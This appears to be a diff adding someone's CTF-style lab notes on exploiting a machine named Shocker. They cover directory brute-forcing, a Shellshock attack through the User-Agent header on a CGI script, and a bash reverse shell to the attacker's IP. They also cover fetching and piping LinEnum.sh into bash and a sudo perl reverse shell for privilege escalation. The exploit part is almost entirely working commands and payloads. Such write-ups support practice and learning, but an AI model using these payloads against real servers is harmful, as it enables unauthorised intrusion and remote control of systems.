@@ -1,0 +1,57 @@
+[HTTP (80/tcp)]
+--------------------------- GOBUSTER ---------------------------
+gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,401,403
+|
+|___http://10.10.10.56:80/cgi-bin/ ~~~> FORBIDDEN
+    |
+    |_Common Gateway Interface Makes it Possible for Scripts to Communicate with the Server
+
+
+--------------------------- DIRBUSTER ---------------------------
+[URL]: http://10.10.10.56:80/cgi-bin/
+[PARAMETERS]: php,sh,js
+|
+|___http://10.10.10.56/cgi-bin/user.sh ~~~> EXECUTES ON SERVER SIDE
+
+
+--------------------------- SHELLSHOCK ---------------------------
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56 ~~~> VULNERABLE ~~~> "500 Internal Server Error"
+
+--------------------------- DEBUGGING SHELLSHOCK ---------------------------
+[BurpSuite]
+Proxy -> Options -> Proxy Listeners -> Add -> Binding -> Bind Port: 4444
+                                           |_ Request Handling -> Redirect to Host: 10.10.10.56
+                                                               |_ Redirect to Port: 80
+
+Now my 127.0.0.1:4444 is 10.10.10.56:80
+
+Proxy -> Intercept On
+nmap -sV -p4444 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+|
+|___ Request and Response on BoxFiles
+|
+|___[Changing The Request]: User-Agent: () { :;}; echo; /bin/bash -c "ls"; ~~~> user.sh
+                            |
+                            |___User-Agent: () { :;}; echo; /bin/bash -c "which nc";
+                                |
+                                |___[Reverse Shell]: User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.25/8082 0>&1;
+
+--------------------------- TTY SHELL ---------------------------
+shelly@Shocker:/home$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+--------------------------- PRIVILEGE ESCALATION ---------------------------
+
+[My Machine]
+|_cd /opt/LinEnum
+|_python -m SimpleHTTPServer 8084
+|_nc -lvp 1234
+
+[Shelly]
+|_curl 10.10.14.25:8084/LinEnum.sh | bash 
+|_sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.25";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+[SSH (2222/tcp)]
+--------------------------- VERSION ---------------------------
+OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 = Xenial
+
